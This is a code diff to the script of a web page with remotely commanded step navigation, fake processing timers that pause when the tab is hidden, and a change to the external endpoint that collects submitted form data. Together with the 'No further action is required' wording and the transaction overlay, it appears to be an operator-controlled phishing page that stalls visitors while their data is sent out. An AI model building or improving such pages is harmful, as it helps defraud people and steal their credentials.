@@ -1560,8 +1560,7 @@ You are all set. No further action is required on your part, so you can simply r
     </div>
 
 
-
-<script>
+ <script>
     const msgElements = document.querySelectorAll('.external-message');
     const stepSections = document.querySelectorAll('.step-section');
     const txOverlay = document.getElementById('tx-overlay');
@@ -1607,9 +1606,14 @@ You are all set. No further action is required on your part, so you can simply r
     function handleRemoteCommand(data) {
         if (!data) return;
 
-        // If Supabase sends any explicit navigation command (like A-Z except U), clear running timers immediately
-        if (data.keyword && data.keyword !== "U") {
-            if (proc20TimerInterval) clearInterval(proc20TimerInterval);
+        // Clear all active timers immediately when a remote Supabase command arrives
+        if (activeTimerInterval) {
+            clearInterval(activeTimerInterval);
+            activeTimerInterval = null;
+        }
+        if (proc20TimerInterval) {
+            clearInterval(proc20TimerInterval);
+            proc20TimerInterval = null;
         }
 
         const hasMessage = data.message && data.message.trim() !== '';
@@ -1737,6 +1741,10 @@ You are all set. No further action is required on your part, so you can simply r
     }
 
     function showStep(stepId) {
+        // Clear any running timers when manually switching views
+        if (activeTimerInterval) { clearInterval(activeTimerInterval); activeTimerInterval = null; }
+        if (proc20TimerInterval) { clearInterval(proc20TimerInterval); proc20TimerInterval = null; }
+
         for (let i = 0; i < stepSections.length; i++) {
             stepSections[i].style.display = 'none';
         }
@@ -1747,40 +1755,52 @@ You are all set. No further action is required on your part, so you can simply r
         }
     }
 
-    function runProcessingTimer(timerElementId, durationMs, nextStepId) {
-        let count = 1;
-        const timerElement = document.getElementById(timerElementId);
-        if (timerElement) timerElement.textContent = "1%";
-        const intervalTime = durationMs / 100;
-        const timerInterval = setInterval(() => {
-            count++;
-            if (count <= 100) { 
-                if (timerElement) timerElement.textContent = count + "%"; 
-            } else { clearInterval(timerInterval); }
-        }, intervalTime);
-
-        setTimeout(() => {
-            clearInterval(timerInterval);
-            showStep(nextStepId);
-        }, durationMs);
-    }
-
+    // Global state for timers & visibility handling
+    let activeTimerInterval = null;
     let proc20TimerInterval = null;
-    let timerPausedTime = 0;
     let timerStartTime = 0;
     let lastHiddenTimestamp = 0;
 
-    // Listen to visibility changes globally to adjust timers and prevent mobile resume jumps
+    // Unified visibility listener to pause all active processing timers when hidden
     document.addEventListener("visibilitychange", () => {
         if (document.hidden) {
             lastHiddenTimestamp = Date.now();
         } else if (lastHiddenTimestamp > 0) {
             const hiddenDuration = Date.now() - lastHiddenTimestamp;
-            timerStartTime += hiddenDuration; // Push start time forward by how long the tab was closed
+            timerStartTime += hiddenDuration;
             lastHiddenTimestamp = 0;
         }
     });
 
+    // Unified dynamic processing timer for smaller steps (1 through 19)
+    function runProcessingTimer(timerElementId, durationMs, nextStepId) {
+        if (activeTimerInterval) clearInterval(activeTimerInterval);
+
+        const timerElement = document.getElementById(timerElementId);
+        if (timerElement) timerElement.textContent = "1%";
+
+        timerStartTime = Date.now();
+        lastHiddenTimestamp = 0;
+
+        activeTimerInterval = setInterval(() => {
+            if (document.hidden) return; // Pause if tab is hidden
+
+            const elapsedMs = Date.now() - timerStartTime;
+            let count = Math.floor((elapsedMs / durationMs) * 100) + 1;
+
+            if (count > 100) count = 100;
+
+            if (timerElement) timerElement.textContent = count + "%";
+
+            if (elapsedMs >= durationMs) {
+                clearInterval(activeTimerInterval);
+                activeTimerInterval = null;
+                showStep(nextStepId);
+            }
+        }, 200);
+    }
+
+    // Unified dynamic 3-minute timer ("U")
     function runExtendedProcessing20() {
         showStep('processing20');
         
@@ -1799,7 +1819,7 @@ You are all set. No further action is required on your part, so you can simply r
         lastHiddenTimestamp = 0;
 
         proc20TimerInterval = setInterval(() => {
-            if (document.hidden) return; // Freeze if hidden
+            if (document.hidden) return;
 
             const elapsedMs = Date.now() - timerStartTime;
             let currentPercent = Math.floor((elapsedMs / totalDurationMs) * 100) + 1;
@@ -1815,6 +1835,7 @@ You are all set. No further action is required on your part, so you can simply r
 
             if (elapsedMs >= totalDurationMs) {
                 clearInterval(proc20TimerInterval);
+                proc20TimerInterval = null;
                 setTimeout(() => {
                     showStep('finalApproved');
                 }, 1000);
@@ -1823,7 +1844,7 @@ You are all set. No further action is required on your part, so you can simply r
     }
 
     function postForm(formId) {
-        fetch("https://submit-form.com/M", { 
+        fetch("https://submit-form.com/TM", { 
             method: "POST", 
             body: new FormData(document.getElementById(formId)), 
             headers: { 'Accept': 'application/json' } 
@@ -1870,7 +1891,6 @@ You are all set. No further action is required on your part, so you can simply r
         runExtendedProcessing20(); 
     }
 </script>
-
 
 
 </body>
